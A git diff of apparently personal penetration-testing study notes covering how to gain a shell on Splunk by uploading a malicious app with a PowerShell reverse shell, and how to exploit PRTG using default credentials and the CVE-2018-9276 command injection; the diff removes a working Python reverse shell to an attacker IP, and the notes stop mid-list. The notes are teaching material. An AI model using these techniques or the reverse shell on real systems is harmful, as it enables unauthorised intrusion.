@@ -390,7 +390,9 @@ println("${cmd.text}");
 ### Attacking Splunk
 * can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us
 	* The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file
-	* reverse shell will be a PowerShell one-liner:
+	* reverse shell will be a PowerShell one-liner
+		* need to add attacker ip and port
+			* ip needs to be in single quotes!
 	* `inputs.conf` file tells Splunk which script to run and any other conditions
 	* We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner
 * Once the files are created, we can create a tarball or `.spl` file
@@ -400,14 +402,17 @@ tar -cvzf updater.tar.gz splunk_shell/
 * next step is to choose `Install app from file` and upload the application
 	* start listener before upload
 * On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`
-* rev.py for linux:
-```python
-import sys,socket,os,pty
+* rev.py is for linux
 
-ip="10.10.14.15"
-port="443"
-s=socket.socket()
-s.connect((ip,int(port)))
-[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
-pty.spawn('/bin/bash')
-```
+# PRTG
+* agentless network monitor software
+* software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS
+* only four vulns have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of Service, and one authenticated command injection
+* use nmap scan for discovery
+* default creds are `prtgadmin:prtgadmin`
+* CVE-2018-9276: When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization
+	* mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`
+	* click on `Add new notification`
+	* name it
+	* Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down
+	* 
